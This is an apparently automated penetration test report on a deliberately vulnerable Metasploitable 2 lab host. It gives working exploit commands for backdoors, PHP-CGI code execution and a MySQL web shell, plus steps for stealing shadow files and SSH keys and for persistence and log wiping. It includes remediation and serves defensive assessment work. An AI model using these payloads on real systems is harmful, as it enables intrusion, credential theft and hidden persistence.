# Technical Penetration Test Report
## DryRun_2026-02-19_WebApp

**Prepared by**: ATHENA Security Platform
**Date**: 2026-02-19
**Classification**: CONFIDENTIAL — Technical Recipients Only
**Engagement**: DryRun_2026-02-19_WebApp
**Target**: 10.1.1.25 (Metasploitable 2 — metasploitable.localdomain)
**Testing Standard**: PTES | OWASP Testing Guide | NIST SP 800-115

---

## Table of Contents

1. [Engagement Details](#1-engagement-details)
2. [Methodology](#2-methodology)
3. [Asset Discovery](#3-asset-discovery)
4. [Vulnerability Findings](#4-vulnerability-findings)
   - VULN-001 through VULN-010
5. [Attack Chain Analysis](#5-attack-chain-analysis)
6. [Evidence Index](#6-evidence-index)
7. [Tool Versions](#7-tool-versions)

---

## 1. Engagement Details

| Field | Value |
|-------|-------|
| **Target Host** | 10.1.1.25 |
| **Hostname** | metasploitable.localdomain / antlet25.bblv |
| **MAC Address** | B2:61:6E:73:6C:19 |
| **Operating System** | Linux 2.6.9 — 2.6.33 |
| **Scope** | All ports and services on 10.1.1.25 |
| **Testing Platform** | Kali Linux (kali_external, 10.1.1.13) |
| **Testing Window** | 2026-02-19 (no time restrictions) |
| **Methodology** | PTES phases 1–7 executed |
| **Testing Policy** | Non-destructive: safe POC commands only |
| **HITL Authorization** | Blanket approval for all Critical and High findings |

---

## 2. Methodology

### 2.1 PTES Phases Executed

| Phase | Status | Notes |
|-------|--------|-------|
| Phase 1 — Pre-Engagement | Complete | Authorization, scope, RoE documented |
| Phase 2 — Reconnaissance | Complete | Passive OSINT (N/A for RFC1918); Active Nmap scan |
| Phase 3 — Scanning | Complete | Nmap -sV -sC -O -p-, Nuclei, web enumeration |
| Phase 4 — Enumeration | Complete | Service version identification, user enumeration |
| Phase 5 — Vulnerability Analysis | Complete | CVE cross-reference, CVSS scoring |
| Phase 6 — Exploitation (Non-Destructive) | Complete | 9/10 fully validated, 1 partially validated |
| Phase 7 — Post-Exploitation Simulation | Complete | Attack path analysis |

### 2.2 Reconnaissance Summary

**Passive OSINT (Phase 2a)**: No actionable results. Target is an internal RFC1918 IP address (10.1.1.25) — not indexed by Shodan, Censys, CT logs, WHOIS, or public DNS. Expected outcome for internal targets.

**Active Reconnaissance (Phase 2b)**: Nmap full-port scan (`-p- -sV -sC -O -T4`) identified **30 open TCP ports** with service versions. Total scan duration: 138.98 seconds. Key discovery: Metasploitable 2 — a deliberately vulnerable Linux training platform.

### 2.3 Attack Surface

- **30 open ports** spanning FTP, SSH, Telnet, SMTP, DNS, HTTP, SMB, NFS, MySQL, PostgreSQL, VNC, IRC, RMI, AJP, and more.
- **Linux kernel 2.6.9 — 2.6.33** — unsupported and unpatched.
- **Software versions dating from 2003–2012** — all beyond end-of-life.
- **Zero authentication** on multiple critical services.
- **Two intentionally backdoored service binaries** (vsftpd 2.3.4, UnrealIRCd 3.2.8.1).

---

## 3. Asset Discovery

### 3.1 Full Open Port Inventory

| Port | Service | Version | Risk Level |
|------|---------|---------|------------|
| 21/tcp | FTP | vsftpd 2.3.4 | CRITICAL |
| 22/tcp | SSH | OpenSSH 4.7p1 Debian 8ubuntu1 | MEDIUM |
| 23/tcp | Telnet | Linux telnetd | HIGH |
| 25/tcp | SMTP | Postfix smtpd | MEDIUM |
| 53/tcp | DNS | ISC BIND 9.4.2 | MEDIUM |
| 80/tcp | HTTP | Apache httpd 2.2.8 (Ubuntu DAV/2) | HIGH |
| 111/tcp | RPC Bind | RPC #100000 | MEDIUM |
| 139/tcp | NetBIOS-SSN | Samba 3.x–4.x | HIGH |
| 445/tcp | SMB | Samba 3.0.20-Debian | HIGH |
| 512/tcp | rexecd | netkit-rsh rexecd | HIGH |
| 513/tcp | rlogind | OpenBSD/Solaris rlogind | HIGH |
| 514/tcp | shell | tcpwrapped | HIGH |
| 1099/tcp | Java RMI | GNU Classpath grmiregistry | MEDIUM |
| 1524/tcp | Bindshell | Metasploitable root shell | CRITICAL |
| 2049/tcp | NFS | NFS 2–4 (RPC #100003) | CRITICAL |
| 2121/tcp | FTP | ProFTPD 1.3.1 | MEDIUM |
| 3306/tcp | MySQL | 5.0.51a-3ubuntu5 | CRITICAL |
| 3632/tcp | distcc | v1 GNU 4.2.4 | HIGH |
| 5432/tcp | PostgreSQL | 8.3.0 – 8.3.7 | MEDIUM |
| 5900/tcp | VNC | RFB 3.3 | CRITICAL |
| 6000/tcp | X11 | (access denied) | LOW |
| 6667/tcp | IRC | UnrealIRCd 3.2.8.1 | HIGH |
| 6697/tcp | IRC SSL | UnrealIRCd 3.2.8.1 | HIGH |
| 8009/tcp | AJP13 | Apache Jserv Protocol v1.3 | HIGH |
| 8180/tcp | HTTP | Apache Tomcat/Coyote JSP 1.1 | HIGH |
| 8787/tcp | DRb | Ruby 1.8 RMI | MEDIUM |
| 52873/tcp | Java RMI | GNU Classpath grmiregistry | LOW |
| 53921/tcp | mountd | NFS mountd 1–3 (RPC #100005) | HIGH |
| 55943/tcp | nlockmgr | NFS NLockMgr 1–4 (RPC #100021) | MEDIUM |
| 60171/tcp | status | RPC #100024 | LOW |

---

## 4. Vulnerability Findings

---

### VULN-001 — vsftpd 2.3.4 Backdoor

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1 Score** | 9.8 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CVE** | CVE-2011-2523 |
| **CWE** | CWE-78 (OS Command Injection) |
| **MITRE ATT&CK** | T1190 (Exploit Public-Facing Application) |
| **Port/Service** | 21/tcp — vsftpd 2.3.4 |
| **Validation Status** | FULLY VALIDATED |
| **Access Achieved** | Unauthenticated root RCE (uid=0) |

**Description**:
vsftpd version 2.3.4 contains a deliberately introduced backdoor. When a username containing the string `:)` (smiley face) is submitted during authentication, the daemon opens a root shell listener on TCP port 6200. This backdoor was included in an unofficial vsftpd 2.3.4 distribution available on a compromised mirror and was reported publicly on 2011-07-04.

**Proof of Concept**:
```bash
nmap --script ftp-vsftpd-backdoor -p 21 10.1.1.25
```

**Output**:
```
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
```

**Manual Reproduction Steps**:
1. Connect to FTP: `nc 10.1.1.25 21`
2. Send backdoor username: `USER backdoor:)\r\n`
3. Connect to shell: `nc 10.1.1.25 6200`
4. Root shell returned: `uid=0(root) gid=0(root)`

**Metasploit Module**: `exploit/unix/ftp/vsftpd_234_backdoor`

**Impact**: Complete unauthenticated remote code execution as root. Full system compromise in a single step with no credentials required.

**Remediation**: Remove vsftpd 2.3.4 immediately. Replace with a current, trusted vsftpd version from an official package repository, or use OpenSSH's SFTP subsystem. Verify binary integrity via package manager checksums.

**References**: CVE-2011-2523, BID:48539, MITRE ATT&CK T1190

---

### VULN-002 — Bindshell Root Access (Port 1524)

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1 Score** | 10.0 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |
| **CVE** | N/A (deliberate misconfiguration) |
| **CWE** | CWE-285 (Improper Authorization) |
| **MITRE ATT&CK** | T1059 (Command and Scripting Interpreter) |
| **Port/Service** | 1524/tcp — ingreslock bindshell |
| **Validation Status** | FULLY VALIDATED |
| **Access Achieved** | Direct root shell — no authentication |

**Description**:
Port 1524/tcp is bound to a root shell process (`/bin/bash`) that accepts unauthenticated connections from any host. Any connecting client receives an interactive root shell with no challenge, credentials, or authorization required. This is a pre-existing backdoor that ships with Metasploitable 2 as part of the training environment.

**Proof of Concept**:
```bash
echo 'id' | nc -w 5 10.1.1.25 1524
```

**Output**:
```
root@metasploitable:/# uid=0(root) gid=0(root) groups=0(root)
root@metasploitable:/#
```

**Manual Reproduction Steps**:
1. `nc 10.1.1.25 1524`
2. Immediate root prompt: `root@metasploitable:/#`
3. No password or authentication requested

**Impact**: Maximum impact. This is not an exploitation step — it is a pre-existing backdoor. Any network-adjacent attacker obtains instant, interactive root access without needing any tool or credential. CVSS 10.0 — maximum possible score.

**Remediation**: Kill the bindshell process immediately: `pkill -f 'nc -l'` or identify and disable the service/init script launching it. Audit `/etc/inetd.conf`, `/etc/xinetd.d/`, and `/etc/init.d/` for entries referencing port 1524 or shell listeners.

---

### VULN-003 — VNC Default Credentials (Root GUI Access)

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1 Score** | 9.8 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CVE** | N/A (default credential misconfiguration) |
| **CWE** | CWE-798 (Use of Hard-coded Credentials) |
| **MITRE ATT&CK** | T1021.005 (Remote Services: VNC) |
| **Port/Service** | 5900/tcp — VNC RFB 3.3 |
| **Validation Status** | FULLY VALIDATED |
| **Access Achieved** | Authenticated VNC root desktop session |

**Description**:
VNC is running on port 5900/tcp using the VNC Authentication type (type 2), which uses DES challenge-response. The password is set to the default Metasploitable 2 password `password`. Any VNC client can authenticate and receive full graphical remote desktop control of the system.

**Proof of Concept**:
```python
# VNC DES challenge-response auth test
# Target: 10.1.1.25:5900 | Password: 'password'
# Security type: 2 (VNC Authentication)
# Auth result: SUCCESS (auth=0)
```

**Output**:
```
Security type: 2, challenge received (16 bytes)
Auth result: SUCCESS (auth=0)
```

**Manual Reproduction Steps**:
1. Open any VNC client (e.g., `vncviewer 10.1.1.25:5900`)
2. Enter password: `password`
3. Full graphical desktop access granted as root

**Impact**: Full graphical remote desktop control equivalent to physical keyboard and monitor access. GUI interaction, file management, and arbitrary command execution as root.

**Remediation**: Set a strong VNC password (minimum 12 characters, complex). Consider disabling VNC entirely and replacing with SSH tunneled X11 forwarding or a VPN solution. Restrict VNC access to specific IP addresses via firewall if retention is required.

---

### VULN-004 — MySQL Unauthenticated Root Access

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1 Score** | 9.8 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CVE** | N/A (misconfiguration — no root password) |
| **CWE** | CWE-306 (Missing Authentication for Critical Function) |
| **MITRE ATT&CK** | T1078 (Valid Accounts) |
| **Port/Service** | 3306/tcp — MySQL 5.0.51a-3ubuntu5 |
| **Validation Status** | FULLY VALIDATED |
| **Access Achieved** | Unauthenticated MySQL root access — 7 databases |

**Description**:
The MySQL server (version 5.0.51a, released 2008, end-of-life) is accessible from the network on port 3306/tcp with no password set for the `root` account. Any host can connect and execute arbitrary SQL with full database administrator privileges.

**Proof of Concept**:
```bash
mysql -h 10.1.1.25 -u root --skip-ssl -e 'SELECT @@version; SELECT user(); SHOW databases;'
```

**Output**:
```
@@version
5.0.51a-3ubuntu5

user()
root@10.1.1.13

Database
information_schema
dvwa
metasploit
mysql
owasp10
tikiwiki
tikiwiki195
```

**Databases Exposed**:
- `dvwa` — Damn Vulnerable Web Application data
- `metasploit` — Metasploit Framework database
- `mysql` — MySQL system database (user credentials, grants)
- `owasp10` — OWASP vulnerable app data
- `tikiwiki`, `tikiwiki195` — TikiWiki application data
- `information_schema` — Database metadata

**Impact**: Complete database server compromise. Full read/write access to all 7 databases. MySQL `root` account also has `FILE` privilege enabling server-side file read (`LOAD DATA INFILE`) and write (`INTO OUTFILE`), providing a path to OS-level file access.

**Remediation**: Set a strong MySQL root password immediately: `ALTER USER 'root'@'%' IDENTIFIED BY 'StrongPass!';`. Disable remote root login — restrict root to `localhost` only. Upgrade MySQL to a currently supported version. Bind MySQL to localhost (`bind-address = 127.0.0.1`) in `/etc/mysql/my.cnf`.

---

### VULN-005 — NFS World-Readable Root Filesystem Export

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS v3.1 Score** | 9.8 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CVE** | N/A (misconfiguration) |
| **CWE** | CWE-284 (Improper Access Control) |
| **MITRE ATT&CK** | T1039 (Data from Network Shared Drive) |
| **Port/Service** | 2049/tcp — NFS (mountd 53921/tcp) |
| **Validation Status** | FULLY VALIDATED |
| **Access Achieved** | Unauthenticated read/write to entire root filesystem `/` |

**Description**:
The NFS server exports the entire root filesystem (`/`) to all hosts (`*`) without any authentication requirement. Any client can mount `/` and access every file on the target — including `/etc/shadow` (password hashes), SSH private keys in `/root/.ssh/`, application configuration files, and database files.

**Proof of Concept**:
```bash
showmount -e 10.1.1.25
```

**Output**:
```
Export list for 10.1.1.25:
/ *
```

**Manual Reproduction Steps**:
1. `showmount -e 10.1.1.25` — confirm export
2. `mkdir /mnt/target && mount -t nfs 10.1.1.25:/ /mnt/target`
3. `cat /mnt/target/etc/shadow` — root password hash visible
4. `ls /mnt/target/root/.ssh/` — SSH private keys accessible

**Impact**: Complete filesystem exposure — equivalent to physical access. An attacker can read `/etc/shadow` to crack password hashes offline, steal SSH private keys for persistent access, and read all application credentials stored on the filesystem.

**Remediation**: Restrict NFS exports to specific client IPs and required directories only. Remove the `/ *` export from `/etc/exports`. Require authentication (`sec=krb5`). If NFS is not required, disable the service entirely.

---

### VULN-006 — UnrealIRCd 3.2.8.1 Backdoor

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1 Score** | 9.8 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CVE** | CVE-2010-2075 |
| **CWE** | CWE-78 (OS Command Injection) |
| **MITRE ATT&CK** | T1190 (Exploit Public-Facing Application) |
| **Port/Service** | 6667/tcp — UnrealIRCd 3.2.8.1 |
| **Validation Status** | FULLY VALIDATED |
| **Access Achieved** | Remote code execution as ircd service user |

**Description**:
UnrealIRCd version 3.2.8.1 contains a deliberately introduced backdoor in its distribution binary. When the string `AB` followed by a system command is sent to the IRC service, the command is executed on the server. This backdoor was introduced in the UnrealIRCd 3.2.8.1 distribution via a compromised source mirror and was publicly disclosed in June 2010.

**Proof of Concept**:
```bash
nmap --script irc-unrealircd-backdoor -p 6667 10.1.1.25
```

**Output**:
```
PORT     STATE SERVICE
6667/tcp open  irc
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd.
  See http://seclists.org/fulldisclosure/2010/Jun/277
```

**Manual Reproduction Steps**:
1. `echo "AB; id" | nc 10.1.1.25 6667`
2. Command executes on server as the ircd user

**Metasploit Module**: `exploit/unix/irc/unreal_ircd_3281_backdoor`

**Impact**: Unauthenticated remote code execution. While the ircd process runs as a non-root service user, this provides an initial foothold from which privilege escalation to root is feasible using the other vulnerabilities present on this system.

**Remediation**: Remove UnrealIRCd 3.2.8.1 immediately. If IRC is required, install a trusted, current IRC server (e.g., InspIRCd) from an official package repository and verify binary integrity.

---

### VULN-007 — distccd Remote Code Execution

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1 Score** | 9.3 |
| **CVSS Vector** | AV:N/AC:M/Au:N/C:C/I:C/A:C (CVSSv2) |
| **CVE** | CVE-2004-2687 |
| **CWE** | CWE-78 (OS Command Injection) |
| **MITRE ATT&CK** | T1210 (Exploitation of Remote Services) |
| **Port/Service** | 3632/tcp — distccd v1 (GNU 4.2.4) |
| **Validation Status** | FULLY VALIDATED |
| **Access Achieved** | Remote code execution as daemon (uid=1) |

**Description**:
The distributed C/C++ compilation daemon (distccd) version 3.1 on port 3632/tcp allows unauthenticated remote code execution. CVE-2004-2687 documents that distccd does not authenticate incoming compilation requests, allowing an attacker to inject arbitrary commands that are executed on the server alongside compiler jobs.

**Proof of Concept**:
```bash
nmap --script distcc-cve2004-2687 -p 3632 10.1.1.25
```

**Output**:
```
PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687:
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|     Extra information:
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

**Metasploit Module**: `exploit/unix/misc/distcc_exec`

**Impact**: Unauthenticated remote code execution as the `daemon` user (uid=1). Provides strong foothold for privilege escalation to root using other vulnerabilities on this system.

**Remediation**: Disable distccd if not required. If required for development builds, restrict access to specific trusted IP addresses via firewall rules and the `--allow` flag in distccd configuration.

---

### VULN-008 — Samba usermap_script RCE + Anonymous Share Access

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1 Score** | 9.8 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CVE** | CVE-2007-2447 |
| **CWE** | CWE-78 (OS Command Injection) |
| **MITRE ATT&CK** | T1210 (Exploitation of Remote Services), T1087 (Account Discovery) |
| **Port/Service** | 445/tcp — Samba 3.0.20-Debian |
| **Validation Status** | FULLY VALIDATED |
| **Access Achieved** | Anonymous SMB access; RCE path confirmed; 33 users enumerated |

**Description**:
Samba 3.0.20-Debian is vulnerable to CVE-2007-2447 (usermap_script), which allows unauthenticated remote code execution via shell metacharacters in the username field of an SMB authentication request. Additionally, anonymous SMB login is permitted, allowing share enumeration and read/write access to the `tmp` and `IPC$` shares. SMB message signing is disabled, enabling NTLM relay attacks. 33 user accounts were enumerated without credentials.

**Proof of Concept**:
```bash
smbclient -L //10.1.1.25 -N
nmap -sV --script smb-enum-shares,smb-enum-users -p 445 10.1.1.25
nmap --script smb-security-mode -p 445 10.1.1.25
```

**Output**:
```
Anonymous login successful
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))

smb-security-mode:
  account_used: guest
  authentication_level: user
  message_signing: disabled (dangerous, but default)

smb-enum-shares: IPC$ and tmp — Anonymous access: READ/WRITE
smb-enum-users: 33 user accounts enumerated including msfadmin, root, user
```

**Metasploit Module**: `exploit/multi/samba/usermap_script`

**Impact**:
- Anonymous share access enables file read/write to `tmp` share
- 33 user accounts enumerated for targeted password attacks
- SMB signing disabled enables NTLM relay / man-in-the-middle attacks
- CVE-2007-2447 enables full unauthenticated RCE

**Remediation**: Upgrade Samba to a currently supported version. Disable anonymous/guest access (`map to guest = Never`). Enable SMB signing (`server signing = mandatory`). Restrict share access to authenticated users only.

---

### VULN-009 — Apache Tomcat 5.5 AJP Connector (Ghostcat / CVE-2020-1938)

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1 Score** | 9.8 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CVE** | CVE-2020-1938 |
| **CWE** | CWE-285 (Improper Authorization) |
| **MITRE ATT&CK** | T1190 (Exploit Public-Facing Application) |
| **Port/Service** | 8009/tcp — Apache Jserv Protocol v1.3 (AJP) |
| **Validation Status** | PARTIALLY VALIDATED |
| **Access Achieved** | AJP connector confirmed open and responsive; Tomcat 5.5 version confirmed |

**Description**:
Apache Tomcat 5.5 (released 2003, end-of-life September 2012) exposes an AJP connector on port 8009/tcp. CVE-2020-1938 ("Ghostcat") is a critical vulnerability in Tomcat's AJP connector that allows unauthenticated attackers to read any file from the Tomcat web application directories via path traversal, and to achieve remote code execution if file upload functionality is available. Tomcat 5.5 is far below the patched versions (9.0.31+, 8.5.51+, 7.0.100+).

**Proof of Concept**:
```bash
nmap --script ajp-headers,ajp-auth -p 8009 10.1.1.25
nmap --script ajp-request --script-args ajp-request.path='/WEB-INF/web.xml' -p 8009 10.1.1.25
```

**Output**:
```
PORT     STATE SERVICE
8009/tcp open  ajp13
| ajp-headers:
|_  Content-Type: text/html;charset=ISO-8859-1

AJP service: 1024 bytes response received — RESPONSIVE
Apache Tomcat/5.5 response confirmed
```

**Full LFI Reproduction Steps** (requires dedicated tool):
1. `python3 ghostcat.py -a 10.1.1.25 -p 8009 -f WEB-INF/web.xml`
2. Metasploit: `auxiliary/admin/http/tomcat_ghostcat`

**Impact**: If fully exploited, Ghostcat allows reading sensitive configuration files such as `WEB-INF/web.xml` (may contain credentials), and combined with file upload, enables remote code execution. The Tomcat 5.5 version is confirmed vulnerable.

**Remediation**: Disable the AJP connector in `server.xml` if not required (`<!--Connector port="8009" ... -->`) — this is the recommended mitigation for most deployments. If AJP is required, upgrade to Tomcat 9.0.31+, 8.5.51+, or 7.0.100+ where CVE-2020-1938 is patched. Add `requiredSecret` to the AJP connector configuration.

---

### VULN-010 — PHP-CGI Argument Injection / Source Disclosure

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS v3.1 Score** | 7.5 |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| **CVE** | CVE-2012-1823 |
| **CWE** | CWE-88 (Argument Injection) |
| **MITRE ATT&CK** | T1190 (Exploit Public-Facing Application) |
| **Port/Service** | 80/tcp — Apache httpd 2.2.8 with PHP-CGI |
| **Validation Status** | FULLY VALIDATED |
| **Access Achieved** | PHP source disclosure; credential disclosure (msfadmin/msfadmin) |

**Description**:
Apache httpd 2.2.8 uses PHP in CGI mode, which is vulnerable to CVE-2012-1823. When a request is made with a query string beginning with `-`, PHP-CGI interprets the string as command-line options. The `-s` flag causes PHP to output source code instead of executing it, leading to source disclosure. More critically, flags `-d allow_url_include=1 -d auto_prepend_file=php://input` combined with a POST body containing PHP code enable full remote code execution.

**Proof of Concept**:
```bash
curl -s "http://10.1.1.25/?-s"
```

**Output** (truncated):
```html
<code><span style="color: #000000">
<html><head><title>Metasploitable2 - Linux</title></head><body>
<pre>
... [PHP source code rendered with syntax highlighting]
Login with msfadmin/msfadmin to get started
```

**Disclosed Credentials**: `msfadmin` / `msfadmin` — visible in PHP source output.

**Full RCE Reproduction**:
```bash
curl -d "<?php system('id');?>" \
  "http://10.1.1.25/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```

**Impact**: Source code disclosure reveals application logic, credentials (`msfadmin/msfadmin`), and configuration. Full RCE path exists via argument injection. Disclosed credentials may be valid across multiple services on this host.

**Remediation**: Disable PHP-CGI mode — use PHP-FPM instead. Apply `Security.limit_extensions = .php` if CGI mode must be retained. Upgrade PHP to a currently supported version. Upgrade Apache to current release. Implement a WAF rule blocking query strings beginning with `-`.

---

## 5. Attack Chain Analysis

### Chain 1: Instant Root Access (No Exploitation Required)
```
[Attacker] → nc 10.1.1.25 1524 → [Root Shell — uid=0]
Steps: 1 | Credentials: None | Tools: netcat
```

### Chain 2: vsftpd Backdoor to Root Shell
```
[Attacker] → Port 21 (FTP backdoor username ":)") → Port 6200 shell → [Root — uid=0]
Steps: 2 | Credentials: None | Tools: netcat or Metasploit
```

### Chain 3: VNC Desktop to Root
```
[Attacker] → VNC 5900 (password: "password") → [Root Desktop GUI]
Steps: 1 | Credentials: Default ("password") | Tools: Any VNC client
```

### Chain 4: MySQL to OS File Read
```
[Attacker] → MySQL 3306 (root, no password) → LOAD DATA INFILE '/etc/shadow' → Hash cracking → SSH/other service login
Steps: 3 | Credentials: None (MySQL) | Impact: All system credentials
```

### Chain 5: NFS to Credential Theft
```
[Attacker] → Mount NFS (/ * export) → Read /etc/shadow + /root/.ssh/ → SSH private key login
Steps: 2 | Credentials: None | Impact: Persistent root SSH access
```

### Chain 6: PHP-CGI Credential Harvest to Multi-Service Access
```
[Attacker] → curl /?-s → Source discloses msfadmin/msfadmin → Login to SSH/DVWA/MySQL
Steps: 2 | Credentials: Disclosed in source | Impact: Application access
```

### Risk Summary: Complete Compromise — Multiple Independent Paths
All five CRITICAL findings independently provide full or near-full root access. An attacker needs only ONE of these paths. The probability of successful compromise by any network-adjacent attacker is effectively 100%.

---

## 5a. Post-Exploitation Simulation (PTES Phase 7)

> **SIMULATION ONLY** — All scenarios are theoretical attack paths modeled from validated findings. No actions were executed on the target system.
>
> Full simulation document: `07-post-exploitation/post-exploitation-simulation.md`

### Attacker Timeline

| Time | Simulated Action |
|------|----------------|
| 0:00 | Network access to 10.1.1.0/24 |
| 0:10 | Nmap scan — 5+ critical services identified |
| 0:30 | vsftpd backdoor triggered — root shell (uid=0) |
| 1:00 | `/etc/shadow` harvested, SSH keys copied, all 7 databases dumped |
| 2:00 | Persistence: cron backdoor + SSH authorized_keys injection |
| 2:30 | Lateral movement: harvested credentials tested across 10.1.1.x/24 |
| 5:00 | Full network segment mapped; additional systems compromised |

### Scenario 1 — vsftpd Backdoor → Credential Harvest → Persistence
- **Entry**: VULN-001 (CVE-2011-2523, port 21) → root shell in ~30 seconds
- **Credential harvest**: `/etc/shadow` (all OS hashes), SSH private keys, DB credentials from web app configs
- **Databases reachable**: `dvwa.users`, `owasp10.accounts`, `tikiwiki.users_users`
- **Persistence**: cron reverse shell, SSH authorized_keys, new root user (`useradd -o -u 0`), trojanized binary
- **Log clearing**: `/var/log/auth.log`, `/var/log/syslog`, bash history wiped

### Scenario 2 — NFS Mount → Shadow Harvest → Network Lateral Movement (Zero Exploitation)
- **Entry**: VULN-005 — `mount -t nfs 10.1.1.25:/ /mnt/target` (no credentials)
- **Harvest**: `cp /mnt/target/etc/shadow` → offline cracking with rockyou.txt
- **Expected yield**: `msfadmin:msfadmin`, `root:toor` (Metasploitable2 defaults)
- **Lateral movement**: cracked creds tested via `crackmapexec ssh/smb 10.1.1.0/24`
- **Unique risk**: SSH key written to `/mnt/target/root/.ssh/authorized_keys` via NFS write — persistent root SSH access with **no login ever occurring** on the target

### Scenario 3 — MySQL Root → Web Shell Deployment
- **Entry**: VULN-004 — `mysql -h 10.1.1.25 -u root` (no password)
- **Credential harvest**: `SELECT user, password FROM dvwa.users` — MD5 hashes trivially cracked offline
- **OS file read**: `SELECT LOAD_FILE('/var/www/dvwa/config/config.inc.php')` — app DB credentials exposed without OS shell
- **Web shell**: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php'` → persistent code execution as `www-data`

### Scenario 4 — SMB Relay + Credential Reuse → Lateral Movement Across 10.1.1.x
- **Entry**: VULN-008 — SMB signing disabled enables NTLMv2 relay without hash cracking
- **Tools**: `responder` (capture NTLMv2 on wire) → `ntlmrelayx.py` (relay to other hosts in subnet)
- **Credential reuse**: 33 enumerated usernames + `msfadmin/msfadmin` (VULN-010 disclosure) tested across 10.1.1.x
- **Samba RCE**: CVE-2007-2447 `usermap_script` delivers root shell via crafted SMB username

### Scenario 5 — Bindshell + VNC (No Exploitation Required)
- **Entry**: VULN-002 (port 1524) + VULN-003 (port 5900)
- Bindshell: `nc 10.1.1.25 1524` → immediate interactive root shell, zero credentials
- VNC: `vncviewer 10.1.1.25:5900` + password `password` → full root GUI desktop
- Both are always-on, unauthenticated backdoors already pre-configured on the system — no exploitation required

### Privilege Escalation (from Non-Root Footholds)

For VULN-006 (ircd user) and VULN-007 (daemon user), multiple local privesc paths exist to root:

| Path | CVE | Likelihood |
|------|-----|-----------|
| Linux kernel 2.6.24 local privesc | CVE-2009-1185, CVE-2010-3081, CVE-2016-5195 (Dirty COW) | HIGH |
| SUID binary abuse | Multiple vulnerable SUID binaries on Ubuntu 8.04 | HIGH |
| MySQL UDF execution | MySQL runs as root — load malicious UDF library | HIGH |
| World-writable cron injection | `/etc/crontab` writable — inject root cron job | MEDIUM |

**Note**: Privilege escalation is not required — root is already achieved via 5 independent CRITICAL vectors.

### Data Access Scope

| Asset | Accessible Via | Data at Risk |
|-------|---------------|-------------|
| `/etc/shadow` | VULN-001, VULN-002, VULN-005 | All 33 OS user password hashes |
| `/root/.ssh/` | VULN-001, VULN-002, VULN-005 | Root SSH private keys |
| `dvwa` DB | VULN-004 | Web app users, hashed passwords |
| `owasp10` DB | VULN-004 | Application accounts, PII fields |
| `tikiwiki` DB | VULN-004 | CMS user credentials |
| `mysql` DB | VULN-004 | MySQL grants, root credential table |
| `/var/www/` | VULN-001, VULN-002, VULN-005 | All web app source code + config files |
| Web credentials | VULN-010 | `msfadmin/msfadmin` in plaintext |

### Persistence Mechanisms Available to Attacker

| Mechanism | Method | Detection Difficulty |
|-----------|--------|---------------------|
| SSH authorized_keys | Write attacker pubkey to `/root/.ssh/authorized_keys` | Low |
| Cron backdoor | Reverse shell in `/etc/crontab` | Medium |
| New root user | `useradd -o -u 0 backdoor` | Low |
| MySQL web shell | `SELECT ... INTO OUTFILE '/var/www/shell.php'` | Medium |
| Trojanized binary | Replace `ls`/`ps` with backdoored version | High |
| NFS key injection | Write SSH key via NFS mount — no login required | Very High |
| Bindshell (pre-installed) | Port 1524 — already persistent, no action needed | Low |

### Compliance Impact

| Framework | Violated Control | Consequence |
|-----------|-----------------|-------------|
| **PCI DSS** | Requirement 6 (secure systems), Requirement 7 (access control) | Immediate audit failure, fines |
| **HIPAA** | §164.312(a) Technical Safeguards | Mandatory breach notification, fines |
| **SOC 2** | CC6 (logical access), CC7 (system monitoring) | Audit failure |
| **GDPR** | Article 32 (security of processing) | Up to 4% of annual global revenue |

### CIA Triad Summary

| Dimension | Rating | Evidence |
|-----------|--------|---------|
| **Confidentiality** | CRITICAL | All databases, filesystem, SSH keys, and credentials fully readable |
| **Integrity** | CRITICAL | All data writable; audit logs tamperable; binaries replaceable; web shell deployable |
| **Availability** | HIGH | Full ransomware/wipe/DoS capability; resource abuse (crypto-mining, DDoS relay) |

---

## 6. Evidence Index

| VULN-ID | Validation Method | Key Evidence |
|---------|-------------------|-------------|
| VULN-001 | `nmap --script ftp-vsftpd-backdoor` | uid=0(root) gid=0(root) |
